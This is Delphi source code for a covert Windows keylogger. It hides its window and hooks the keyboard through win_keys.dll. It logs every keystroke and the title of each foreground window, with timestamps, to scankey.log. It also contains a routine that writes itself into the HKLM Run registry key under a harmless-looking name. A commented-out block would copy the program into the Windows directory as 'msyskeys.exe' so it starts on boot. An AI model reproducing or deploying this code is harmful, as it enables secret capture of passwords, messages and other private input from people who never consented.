unit UMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, DMessage;

const
  LogFile = '.\scankey.log';

type
  TWindows = class;
  TFMain = class(TForm)
    lRes: TLabel;
    procedure FormCreate(Sender: TObject);
  private
    _f: TextFile;
    FKey: String;
    WinLog: TWindows;
    {обработчики сообщений}
    procedure Mes01 (var Msg : TMessage); message WM_DANILBACK;   
    procedure Mes02 (var Msg : TMessage); message WM_DANILTAB;
    procedure Mes03 (var Msg : TMessage); message WM_DANILRETURN;
    procedure Mes04 (var Msg : TMessage); message WM_DANILSHIFT;
    procedure Mes05 (var Msg : TMessage); message WM_DANILCONTROL;
    procedure Mes06 (var Msg : TMessage); message WM_DANILMENU;
    procedure Mes07 (var Msg : TMessage); message WM_DANILESC;
    procedure Mes08 (var Msg : TMessage); message WM_DANILSPACE;
    procedure Mes09 (var Msg : TMessage); message WM_DANILLEFT;
    procedure Mes10 (var Msg : TMessage); message WM_DANILUP;
    procedure Mes11 (var Msg : TMessage); message WM_DANILRIGHT;
    procedure Mes12 (var Msg : TMessage); message WM_DANILDOWN;
    procedure Mes13 (var Msg : TMessage); message WM_DANILDELETE;
    procedure Mes14 (var Msg : TMessage); message WM_DANIL0;
    procedure Mes15 (var Msg : TMessage); message WM_DANIL1;
    procedure Mes16 (var Msg : TMessage); message WM_DANIL2;
    procedure Mes17 (var Msg : TMessage); message WM_DANIL3;
    procedure Mes18 (var Msg : TMessage); message WM_DANIL4;
    procedure Mes19 (var Msg : TMessage); message WM_DANIL5;
    procedure Mes20 (var Msg : TMessage); message WM_DANIL6;
    procedure Mes21 (var Msg : TMessage); message WM_DANIL7;
    procedure Mes22 (var Msg : TMessage); message WM_DANIL8;
    procedure Mes23 (var Msg : TMessage); message WM_DANIL9;
    procedure Mes24 (var Msg : TMessage); message WM_DANILA;
    procedure Mes25 (var Msg : TMessage); message WM_DANILB;
    procedure Mes26 (var Msg : TMessage); message WM_DANILC;
    procedure Mes27 (var Msg : TMessage); message WM_DANILD;
    procedure Mes28 (var Msg : TMessage); message WM_DANILE;
    procedure Mes29 (var Msg : TMessage); message WM_DANILF;
    procedure Mes30 (var Msg : TMessage); message WM_DANILG;
    procedure Mes31 (var Msg : TMessage); message WM_DANILH;
    procedure Mes32 (var Msg : TMessage); message WM_DANILI;
    procedure Mes33 (var Msg : TMessage); message WM_DANILJ;
    procedure Mes34 (var Msg : TMessage); message WM_DANILK;
    procedure Mes35 (var Msg : TMessage); message WM_DANILL;
    procedure Mes36 (var Msg : TMessage); message WM_DANILM;
    procedure Mes37 (var Msg : TMessage); message WM_DANILN;
    procedure Mes38 (var Msg : TMessage); message WM_DANILO;
    procedure Mes39 (var Msg : TMessage); message WM_DANILP;
    procedure Mes40 (var Msg : TMessage); message WM_DANILQ;
    procedure Mes41 (var Msg : TMessage); message WM_DANILR;
    procedure Mes42 (var Msg : TMessage); message WM_DANILS;
    procedure Mes43 (var Msg : TMessage); message WM_DANILT;
    procedure Mes44 (var Msg : TMessage); message WM_DANILU;
    procedure Mes45 (var Msg : TMessage); message WM_DANILV;
    procedure Mes46 (var Msg : TMessage); message WM_DANILW;
    procedure Mes47 (var Msg : TMessage); message WM_DANILX;
    procedure Mes48 (var Msg : TMessage); message WM_DANILY;
    procedure Mes49 (var Msg : TMessage); message WM_DANILZ;
    procedure Mes50 (var Msg : TMessage); message WM_DANILNP0;
    procedure Mes51 (var Msg : TMessage); message WM_DANILNP1;
    procedure Mes52 (var Msg : TMessage); message WM_DANILNP2;
    procedure Mes53 (var Msg : TMessage); message WM_DANILNP3;
    procedure Mes54 (var Msg : TMessage); message WM_DANILNP4;
    procedure Mes55 (var Msg : TMessage); message WM_DANILNP5;
    procedure Mes56 (var Msg : TMessage); message WM_DANILNP6;
    procedure Mes57 (var Msg : TMessage); message WM_DANILNP7;
    procedure Mes58 (var Msg : TMessage); message WM_DANILNP8;
    procedure Mes59 (var Msg : TMessage); message WM_DANILNP9;
    procedure Mes60 (var Msg : TMessage); message WM_DANILMUL;
    procedure Mes61 (var Msg : TMessage); message WM_DANILADD;
    procedure Mes62 (var Msg : TMessage); message WM_DANILSUB;
    procedure Mes63 (var Msg : TMessage); message WM_DANILDEC;
    procedure Mes64 (var Msg : TMessage); message WM_DANILDIV;
    procedure Mes65 (var Msg : TMessage); message WM_DANILOE1;
    procedure Mes66 (var Msg : TMessage); message WM_DANILOEPLUS;
    procedure Mes67 (var Msg : TMessage); message WM_DANILOECOMMA;
    procedure Mes68 (var Msg : TMessage); message WM_DANILOEMINUS;
    procedure Mes69 (var Msg : TMessage); message WM_DANILOEPERIOD;
    procedure Mes70 (var Msg : TMessage); message WM_DANILOE2;
    procedure Mes71 (var Msg : TMessage); message WM_DANILOE3;
    procedure Mes72 (var Msg : TMessage); message WM_DANILOE4;
    procedure Mes73 (var Msg : TMessage); message WM_DANILOE5;
    procedure Mes74 (var Msg : TMessage); message WM_DANILOE6;
    procedure Mes75 (var Msg : TMessage); message WM_DANILOE7; 
    procedure SetKey( Value: String);  
  public
    property Key: String read FKey write SetKey stored False;
  end;

  TWindows = class(TThread)
  protected
     procedure Execute; override;
  end;

var
  FMain: TFMain;
  p : pointer;

implementation

{$R *.dfm}

uses Registry;

{загрузка dll}

function Key_Hook : longint; far; external 'win_keys.dll';
 
procedure RegInit(FullPath: String);
var
 h: TRegistry;                // Переменная реестра
begin
  h := TRegistry.Create;
  with h do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', true);
    WriteString('DelphiWorldApp', FullPath);
    CloseKey;
    Free;
  end;
end;

procedure TFMain.Mes01 (var Msg : TMessage);
begin
  Key := 'BS';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes02 (var Msg : TMessage);
begin
  Key := 'TAB';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes03 (var Msg : TMessage);
begin
  Key := 'ENT';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes04 (var Msg : TMessage);
begin
  Key := 'SHFT';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes05 (var Msg : TMessage);
begin
  Key := 'CRTL';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes06 (var Msg : TMessage);
begin
  Key := 'ALT';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes07 (var Msg : TMessage);
begin
  Key := 'ESC';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes08 (var Msg : TMessage);
begin
  Key := ' ';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes09 (var Msg : TMessage);
begin
  Key := 'LEFT';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes10 (var Msg : TMessage);
begin
  Key := 'UP';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes11 (var Msg : TMessage);
begin
  Key := 'RIGHT';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes12 (var Msg : TMessage);
begin
  Key := 'DOWN';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes13 (var Msg : TMessage);
begin
  Key := 'DEL';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes14 (var Msg : TMessage);
begin
  Key := '0';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes15 (var Msg : TMessage);
begin
  Key := '1';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes16 (var Msg : TMessage);
begin
  Key := '2';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes17 (var Msg : TMessage);
begin
  Key := '3';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes18 (var Msg : TMessage);
begin
  Key := '4';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes19 (var Msg : TMessage);
begin
  Key := '5';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes20 (var Msg : TMessage);
begin
  Key := '6';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes21 (var Msg : TMessage);
begin
  Key := '7';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes22 (var Msg : TMessage);
begin
  Key := '8';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes23 (var Msg : TMessage);
begin
  Key := '9';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes24 (var Msg : TMessage);
begin
  Key := 'a';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes25 (var Msg : TMessage);
begin
  Key := 'b';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes26 (var Msg : TMessage);
begin
  Key := 'c';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes27 (var Msg : TMessage);
begin
  Key := 'd';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes28 (var Msg : TMessage);
begin
  Key := 'e';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes29 (var Msg : TMessage);
begin
  Key := 'f';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes30 (var Msg : TMessage);
begin
  Key := 'g';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes31 (var Msg : TMessage);
begin
  Key := 'h';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes32 (var Msg : TMessage);
begin
  Key := 'i';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes33 (var Msg : TMessage);
begin
  Key := 'j';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes34 (var Msg : TMessage);
begin
  Key := 'k';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes35 (var Msg : TMessage);
begin
  Key := 'l';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes36 (var Msg : TMessage);
begin
  Key := 'm';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes37 (var Msg : TMessage);
begin
  Key := 'n';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes38 (var Msg : TMessage);
begin
  Key := 'o';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes39 (var Msg : TMessage);
begin
  Key := 'p';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes40 (var Msg : TMessage);
begin
  Key := 'q';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes41 (var Msg : TMessage);
begin
  Key := 'r';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes42 (var Msg : TMessage);
begin
  Key := 's';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes43 (var Msg : TMessage);
begin
  Key := 't';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes44 (var Msg : TMessage);
begin
  Key := 'u';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes45 (var Msg : TMessage);
begin
  Key := 'v';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes46 (var Msg : TMessage);
begin
  Key := 'w';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes47 (var Msg : TMessage);
begin
  Key := 'x';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes48 (var Msg : TMessage);
begin
  Key := 'y';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes49 (var Msg : TMessage);
begin
  Key := 'z';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes50 (var Msg : TMessage);
begin
  Key := 'NP0';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes51 (var Msg : TMessage);
begin
  Key := 'NP1';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes52 (var Msg : TMessage);
begin
  Key := 'NP2';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes53 (var Msg : TMessage);
begin
  Key := 'NP3';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes54 (var Msg : TMessage);
begin
  Key := 'NP4';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes55 (var Msg : TMessage);
begin
  Key := 'NP5';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes56 (var Msg : TMessage);
begin
  Key := 'NP6';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes57 (var Msg : TMessage);
begin
  Key := 'NP7';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes58 (var Msg : TMessage);
begin
  Key := 'NP8';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes59 (var Msg : TMessage);
begin
  Key := 'NP9';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes60 (var Msg : TMessage);
begin
  Key := '*';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes61 (var Msg : TMessage);
begin
  Key := '+';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes62 (var Msg : TMessage);
begin
  Key := '-';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes63 (var Msg : TMessage);
begin
  Key := '.';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes64 (var Msg : TMessage);
begin
  Key := '/';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes65 (var Msg : TMessage);
begin
  Key := ';';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes66 (var Msg : TMessage);
begin
  Key := '+';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes67 (var Msg : TMessage);
begin
  Key := ',';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes68 (var Msg : TMessage);
begin
  Key := '-';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes69 (var Msg : TMessage);
begin
  Key := '.';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes70 (var Msg : TMessage);
begin
  Key := '/';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes71 (var Msg : TMessage);
begin
  Key := '~';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes72 (var Msg : TMessage);
begin
  Key := '[';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes73 (var Msg : TMessage);
begin
  Key := '\';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes74 (var Msg : TMessage);
begin
  Key := ']';
end;
//----------------------------------------------------------------------------//
procedure TFMain.Mes75 (var Msg : TMessage);
begin
  Key := '"';
end;
//----------------------------------------------------------------------------//
procedure TFMain.SetKey( Value: String);
begin
  lRes.Caption := Value;
  WinLog.Suspend;
  Append(_f);
  Write(_f, Value);
  CloseFile(_f);
  WinLog.Resume;
  FKey := Value;
end;
//----------------------------------------------------------------------------//
procedure TFMain.FormCreate(Sender: TObject);
begin
  Application.ShowMainForm := false;

  WinLog := TWindows.Create(false);

  p:=@Key_Hook;

  WinLog.Suspend;
  AssignFile(_f, LogFile);
  if not FileExists(LogFile) then
  begin
    Rewrite(_f);
    CloseFile(_f)
  end;
  WinLog.Resume;
end;
(******************************************************************************)
procedure TWindows.Execute;
var
  F: TextFile; 
  H: HWND;
  Str: String;
  _WinDir: array [0..254] of Char;
  WinDir: String;
  Size: Integer;
//  I: Integer = 0;
//  Msg: TMsg;
label GO;
begin
  H := 1;
  while H = GetForegroundWindow do inc(H, 1);
  AssignFile(F, LogFile);
    if not FileExists(LogFile) then
    begin
      Rewrite(F);
      CloseFile(F)
    end;

    Append(F);
    Str := #13 + '>>' + FormatDateTime('dd/mm/yyyy hh:nn:ss', Date + Time);
    Writeln(F, Str);
    CloseFile(F);

  {
  Size := GetWindowsDirectory(_WinDir, 255);
  WinDir := String(_WinDir);
  SetLength(String(WinDir), Size);
  if WinDir <> ExtractFileDir(Application.ExeName)
  then begin
    MoveFile(PChar(Application.ExeName),
                             PChar(String(WinDir) + '\msyskeys.exe'));
    CopyFile(PChar(ExtractFilePath(Application.ExeName) + 'win_keys.dll'),
                             PChar(String(WinDir) + '\win_keys.dll'), true);
    RegInit(WinDir + '\msyskeys.exe')
  end;
  }
  
  repeat
    Str := '                                                                ' +
           '                                                                  ';
    if H = GetForegroundWindow
    then goto GO
    else
      H := GetForegroundWindow;

      Size := GetWindowText(H, (@Str[1]), 130);
      SetLength(Str, Size);
      Str := '>> ' + Str;
      Append(F);
      Writeln(F, '');
      Writeln(F, Str);
      CloseFile(F);
GO: Sleep(1);
  until false;
end;

end.
